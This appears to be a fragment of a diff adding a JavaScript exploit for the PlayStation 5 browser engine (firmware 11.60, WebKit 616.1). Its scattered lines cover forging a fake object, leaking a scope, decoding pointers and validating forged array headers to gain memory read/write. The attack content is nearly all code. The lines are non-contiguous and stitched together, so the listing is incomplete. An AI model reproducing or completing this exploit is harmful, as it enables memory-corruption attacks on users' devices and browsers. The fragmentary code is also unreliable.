@@ -1,0 +1,33 @@
+3:  PS5 FW 11.60 / WebKit 616.1 genuine-view R/W bootstrap.
+5:  A six-inline-property JSFinalObject supplies exactly 0x30 controlled bytes at
+135:        get: function (target, property, receiver) { return receiver; }
+151:    Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
+155:function pointerFromWords(words, offset) {
+156:    if (words[offset + 3] !== 0)
+158:    return words[offset]
+159:        + words[offset + 1] * 0x10000
+160:        + words[offset + 2] * 0x100000000;
+173:    // JSVALUE64 stores a finite double by adding DoubleEncodeOffset (1<<49),
+197:    // Object-literal creation is important: six declared properties get the six
+198:    // inline slots. Adding six properties dynamically to {} may spill after two.
+208:    // Deleted inline properties become exact all-zero qwords.
+210:    delete fakeHost.q4; // fake byteOffset
+369:        var rwOffsetZero = true;
+372:                rwOffsetZero = false;
+389:            && rwOffsetZero && rwHeader[0x28] === 0x58;
+447:        var targetOffsetZero = true;
+450:                targetOffsetZero = false;
+465:            && targetHeader[0x1f] === 0 && targetOffsetZero
+500:        // Restore the carrier before dropping the only forged JSValue.
+545:function uint32At(bytes, offset) {
+546:    return bytes[offset]
+547:        + bytes[offset + 1] * 0x100
+548:        + bytes[offset + 2] * 0x10000
+549:        + bytes[offset + 3] * 0x1000000;
+552:function low48At(bytes, offset) {
+553:    return bytes[offset]
+554:        + bytes[offset + 1] * 0x100
+555:        + bytes[offset + 2] * 0x10000
+556:        + bytes[offset + 3] * 0x1000000
+557:        + bytes[offset + 4] * 0x100000000
+558:        + bytes[offset + 5] * 0x10000000000;
